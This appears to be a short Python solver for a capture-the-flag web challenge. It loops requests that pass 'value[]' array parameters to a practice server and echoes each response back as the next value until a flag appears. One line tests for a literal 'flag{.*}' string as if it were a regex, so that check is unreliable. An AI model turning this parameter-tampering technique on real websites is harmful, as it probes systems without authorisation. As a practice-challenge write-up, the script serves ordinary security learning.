import requests
url='http://***.changame.ichunqiu.com/'
session=requests.Session()
html=session.get(url+'?value[]=ea').text
for i in range(10):
    html=session.get(url+'?value[]='+html[0:2]).text
    if 'flag{.*}' in html:
        break
print (html)